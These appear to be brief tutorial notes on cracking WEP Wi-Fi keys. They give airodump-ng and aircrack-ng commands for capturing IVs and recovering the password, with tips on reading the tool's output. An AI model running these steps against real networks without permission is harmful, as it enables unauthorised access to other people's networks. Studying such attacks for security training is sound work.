# Old encryption, can be easily cracked, uses an algortihm called RC4, wired equivalent privacy.
# Client encrypts data using a key, encrypted packet sent in the air, router decrypts packet using the key

BUSY NETWORK
To crack WEP we need to:
 1) Capture a large number of packets/Ivs (using airodump-ng)
 2) Analyse the captured Ivs and crack the key (using aircrack-ng)

$ airodump-ng --bssid BSSID -channel CHANNEL --write FILENAME INT
# See column #Data â€¦ number of useful packets with different Ivs (100 000 #Data could be enough)
$ aircrack-ng FILENAME
# Now there should be a message Decrypted correctly: 100% and KEY FOUND! Wifi password is after ASCII: PASSWORD
# If the ASCII password is not there, you could connect with decrapted MAC after KEY FOUND (copy the MAC address to a password prompt of the wifi network without double dots)
